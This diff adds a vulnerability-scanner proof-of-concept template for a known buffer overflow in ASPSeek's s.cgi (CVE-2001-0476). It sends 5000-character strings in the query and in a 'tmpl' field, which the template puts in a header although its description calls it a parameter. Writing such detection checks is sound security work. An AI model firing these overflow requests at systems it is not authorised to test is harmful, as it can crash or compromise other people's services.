@@ -1,0 +1,47 @@
+[info]
+author = "ave"
+description = "向 ASPSeek 的 s.cgi 发送超长 HTTP 查询字符串或超长 tmpl 参数，触发缓冲区溢出，验证漏洞存在"
+id = "POC-AVE-2001-0192"
+name = "SWSoft ASPSeek s.cgi 远程缓冲区溢出 PoC"
+severity = "high"
+tags = ["ave-2001-0192"]
+vuln_id = [
+    "CVE-2001-0476",
+    "AVE-2001-0192",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = '/{{BaseURL}}/cgi-bin/s.cgi?{{repeat("A", 5000)}}'
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "error",
+    "overflow",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/s.cgi"
+protocol = "http"
+
+[poc.requests.headers]
+tmpl = '{{repeat("A", 5000)}}'
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "error",
+    "overflow",
+]
